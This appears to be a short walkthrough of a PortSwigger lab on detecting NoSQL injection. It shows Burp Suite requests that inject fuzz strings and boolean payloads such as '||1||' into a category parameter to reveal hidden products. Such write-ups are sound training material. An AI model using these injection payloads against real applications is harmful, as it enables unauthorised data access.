# [Detecting NoSQL injection](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-detection)

> solve the lab with NoSQL syntax injection

- open the lab in burp browser
- filter for the "Gift"
- check the `Proxy` -> `HTTP history`
- send the `...=Gift` request to the repeater

## testing for syntax error

- in the repeater there should be something like this

```
GET /filter?category=Gifts HTTP/2
...
```

> add the following fuzz strings to the "Gift"

---

`'`

- `GET /filter?category=Gifts' HTTP/2`
- that will cause a js syntax error

---

`'+'`

- `GET /filter?category=Gifts'+' HTTP/2`
- that will cause a js syntax error
- but try to url encode it (ctrl+u)
- `GET /filter?category=Gifts'%2b' HTTP/2`
- no syntax error

---

`' && 0 && 'x`

- inject `false` condition in the category
- `GET /filter?category=Gifts'+%26%26+0+%26%26+'x HTTP/2`
- this will return nothing

---

`' && 1 && 'x`

- inject `true` condition in the category
- `GET /filter?category=Gifts'+%26%26+1+%26%26+'x HTTP/2`
- this will return the filtered categories

---

`'||1||'`

- Submit a boolean condition that always evaluates to true in the category parameter
- `GET /filter?category=Gifts'||1||' HTTP/2`
- this will return some hidden categories
- open the request response in burp browser
- `message action hamburger menu` -> `request in browser` -> `in original session` -> `copy`
- insert it in the burp browser
